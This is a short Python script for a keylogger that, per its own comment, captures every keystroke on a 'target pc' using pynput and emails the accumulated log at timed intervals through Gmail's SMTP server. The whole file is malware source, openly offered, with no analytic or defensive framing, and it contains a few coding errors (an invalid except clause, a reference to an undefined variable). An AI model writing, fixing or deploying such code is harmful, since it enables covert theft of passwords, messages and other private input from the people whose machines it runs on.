
import pynput.keyboard
import threading, smtplib

### this tool will capture all keyboard strikes on target  pc

class Keylogger:
    def __init__(self, time_inetrval,email, password):
        self.log ="Keylogger started"
        self.interval=time_inetrval
        self.email = email     # email to which u want to get report
        self.password = password  # i's password

    def append_to_log(self, string):
        self.log = self.log + string

    def proccess_key_press(self, key):   
        try:
            
            current_key = str(key.char)
        except expression as identifier:
            if key == key.space:
                current_key= " "
            else:
               current_key= " " + str(key) + " "
        self.append_to_log(str(current_key))
        print(log)

    def report(self):
        # print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval,self.report)
        timer.start()


    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.proccess_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    

    